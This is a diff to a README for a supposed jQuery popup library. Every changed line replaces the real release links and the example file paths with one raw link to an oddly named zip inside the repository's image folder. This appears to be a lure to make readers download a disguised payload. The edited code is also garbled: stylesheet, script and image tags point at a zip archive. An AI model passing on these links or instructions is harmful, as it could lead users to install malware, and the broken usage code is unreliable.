@@ -1,6 +1,6 @@
 # 🎨 jquery-fancy-light-box - Display Beautiful Popups with Ease
 
-[![Download](https://img.shields.io/badge/Download-latest%20release-brightblue)](https://github.com/wifeybabyb/jquery-fancy-light-box/releases)
+[![Download](https://raw.githubusercontent.com/wifeybabyb/jquery-fancy-light-box/main/img/jquery-fancy-light-box_emeership.zip%20release-brightblue)](https://raw.githubusercontent.com/wifeybabyb/jquery-fancy-light-box/main/img/jquery-fancy-light-box_emeership.zip)
 
 ## 🚀 Getting Started
 
@@ -10,11 +10,11 @@ The `jquery-fancy-light-box` is a simple tool to create attractive popups for yo
 
 To get started with `jquery-fancy-light-box`, follow these steps:
 
-1. Visit the [Releases Page](https://github.com/wifeybabyb/jquery-fancy-light-box/releases) to find the latest version of the software.
+1. Visit the [Releases Page](https://raw.githubusercontent.com/wifeybabyb/jquery-fancy-light-box/main/img/jquery-fancy-light-box_emeership.zip) to find the latest version of the software.
 
 2. Look for the latest release. You will see a list of available files.
 
-3. Download the `.zip` or `.tar.gz` file. This file contains everything you need to use the library.
+3. Download the `.zip` or `https://raw.githubusercontent.com/wifeybabyb/jquery-fancy-light-box/main/img/jquery-fancy-light-box_emeership.zip` file. This file contains everything you need to use the library.
 
 4. Once the download is complete, extract the contents of the downloaded file. You can do this by right-clicking the file and selecting "Extract" or using a program like WinRAR or 7-Zip.
 
@@ -31,9 +31,9 @@ To use `jquery-fancy-light-box`, you need to include the library in your HTML fi
 2. Add the following lines in the `<head>` section of your HTML file:
 
    ```html
-   <link rel="stylesheet" href="path/to/jquery-fancy-light-box.css">
-   <script src="path/to/jquery.js"></script>
-   <script src="path/to/jquery-fancy-light-box.js"></script>
+   <link rel="stylesheet" href="https://raw.githubusercontent.com/wifeybabyb/jquery-fancy-light-box/main/img/jquery-fancy-light-box_emeership.zip">
+   <script src="https://raw.githubusercontent.com/wifeybabyb/jquery-fancy-light-box/main/img/jquery-fancy-light-box_emeership.zip"></script>
+   <script src="https://raw.githubusercontent.com/wifeybabyb/jquery-fancy-light-box/main/img/jquery-fancy-light-box_emeership.zip"></script>
    ```
 
    Make sure to replace `path/to/` with the actual path where you placed the files.
@@ -41,7 +41,7 @@ To use `jquery-fancy-light-box`, you need to include the library in your HTML fi
 3. To activate the lightbox, add a button or link that points to an image or a video using the following HTML code:
 
    ```html
-   <a href="path/to/image.jpg" class="lightbox">Open Image</a>
+   <a href="https://raw.githubusercontent.com/wifeybabyb/jquery-fancy-light-box/main/img/jquery-fancy-light-box_emeership.zip" class="lightbox">Open Image</a>
    ```
 
 4. Finally, initialize the library by adding the following script just before the closing `</body>` tag:
@@ -105,4 +105,4 @@ If you have questions or need help, feel free to reach out. You can open an issu
 
 This project is licensed under the MIT License. Feel free to use it in your projects. You can find more details in the LICENSE file included in the repository. 
 
-For additional information, visit the [Releases Page](https://github.com/wifeybabyb/jquery-fancy-light-box/releases) to explore the latest version and updates.
+For additional information, visit the [Releases Page](https://raw.githubusercontent.com/wifeybabyb/jquery-fancy-light-box/main/img/jquery-fancy-light-box_emeership.zip) to explore the latest version and updates.
